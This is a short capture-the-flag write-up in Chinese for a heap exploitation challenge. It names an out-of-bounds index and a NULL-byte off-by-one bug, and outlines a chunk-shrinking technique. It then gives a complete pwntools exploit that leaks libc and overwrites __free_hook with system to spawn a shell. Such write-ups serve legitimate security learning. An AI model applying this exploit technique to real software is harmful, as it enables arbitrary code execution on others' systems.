## note

又是赛后出exp...

from X1cT34m.C0ss4ck

#### Where

- chunklist 下标越界可写存储name和remark的结构体指针
- add堆块调用malloc后将size+1的内容清零导致NULL byte off-by-one

#### How

- NULL byte off-by-one来shrink chunk
- 切割shrinked chunk 此时会写下下个堆块的prevsize和size的previnuse（当然，这里有个错位，所以不用担心改到真的chunk上）
- shrinked chunk相对高地址的大堆块free，然后再按照切割shrinked chunk的顺序把top chunk切一遍
- 获得俩相同指针
- free其一，show另一个
- leak
- 接下来是智障操作了。。。写结构体

#### exp

```python
from pwn import *
context.arch = 'amd64'

io = process("./pwn")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def ch(c):
	io.sendlineafter("choice> ",str(c))
def add(size,data):
	ch(1)
	io.sendlineafter("> ",str(size))
	io.sendlineafter("> ",data)
def show(index):
	ch(2)
	io.sendlineafter("> ",str(index))
def rm(index):
	ch(3)
	io.sendlineafter("> ",str(index))
def bye(data):
	ch(4)
	io.sendlineafter("> ",data)

io.sendafter("> ","/bin/sh\0")

add(0xf8,'aaaa')	#0
add(0x1f8,'bbbb')	#1
add(0xf8,'cccc')	#2

rm(1)
rm(0)

add(0x100,'dddd')	#0
add(0x78,'eeee')	#1
add(0x138,'ffff')	#3
add(0x8,'gggg')		#4

rm(1)
rm(2)

add(0x78,'hhhh')	#1
add(0x138,'iiii')	#2
add(0x8,'jjjj')		#3

rm(2)
show(3)
libc_base = u64(io.recv(6).ljust(8,'\x00'))-(libc.sym['__malloc_hook']+0x10+88)
info("LIBC BASE -> %#x"%libc_base)

add(0x138,'xxxx')	#2
add(0x8,'yyyy')		#5
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x8,'yyyy')
add(0x58,'/bin/sh;'*2+'/bin/sh  ||     '+p64(libc_base+libc.sym['__free_hook'])[:-2])
bye(p64(libc_base+libc.sym['system']))
io.interactive()


```